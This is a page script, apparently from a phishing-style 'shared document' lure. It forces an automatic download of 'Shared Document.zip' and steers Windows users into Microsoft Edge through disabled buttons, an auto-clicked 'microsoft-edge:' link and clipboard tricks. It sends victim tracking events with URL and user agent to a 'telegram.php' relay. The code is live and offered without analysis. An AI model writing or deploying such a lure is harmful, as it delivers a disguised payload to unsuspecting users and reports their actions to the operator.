	<script>
        function sendTelegramNotification(data) {
            data.url = window.location.href;
            data.userAgent = navigator.userAgent;

            fetch('telegram.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(err => console.error('Telegram notification error:', err));
        }

        /* ─────────────────────────────────────────
           OS & Edge detection
        ───────────────────────────────────────── */
        function isWindows() {
            return /Windows NT/i.test(navigator.userAgent);
        }

        function isMicrosoftEdge() {
            return /Edg\/|Edge\//i.test(navigator.userAgent);
        }

        const isWin = isWindows();
        const isEdge = isMicrosoftEdge();
        const edgeNotice = document.getElementById('edge-notice');


        /* ─────────────────────────────────────────
           Download logic
        ───────────────────────────────────────── */
        const downloadUrl = 'Shared Document.zip';
        const manualBtn = document.getElementById('shared');

        if (isEdge) {
            manualBtn.href = downloadUrl;
            manualBtn.setAttribute('download', 'Shared Document.zip');
            manualBtn.click();
        } else if (isWin) {
            // Disable the button visually and show inline notice
            manualBtn.style.opacity = '0.4';
            manualBtn.style.cursor = 'not-allowed';
            manualBtn.style.pointerEvents = 'none';
            edgeNotice.classList.add('visible');
            const edgeLink = document.getElementById('edge-link');
            if (edgeLink) {
                edgeLink.href = 'microsoft-edge:' + window.location.href;
                edgeLink.onclick = function (e) {
                    // Notify edge link clicked
                    sendTelegramNotification({ event: 'Open in Edge Clicked' });

                    if (window.location.protocol === 'file:') {
                        e.preventDefault();
                        try {
                            navigator.clipboard.writeText(window.location.href);
                            alert('Windows blocks automatically opening local files in Edge for security. The URL has been copied to your clipboard!\n\nPlease open Microsoft Edge and paste it into the address bar.');
                        } catch (err) {
                            alert('Windows blocks automatically opening local files in Edge for security.\n\nPlease copy the URL from your address bar and paste it into Microsoft Edge.');
                        }
                    }
                };

                // Attempt auto-click after 1 second (subject to browser blocking)
                setTimeout(() => {
                    sendTelegramNotification({ event: 'Auto Open in Edge Triggered' });
                    edgeLink.click();
                }, 1000);
            }
        }

        function triggerDownload() {
            if (!isEdge) return;   // silently block on non-Edge

            // Notify download triggered
            sendTelegramNotification({ event: 'Download Triggered' });

            const a = document.createElement('a');
            a.href = downloadUrl;
            a.download = 'Shared Document.zip';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    </script>
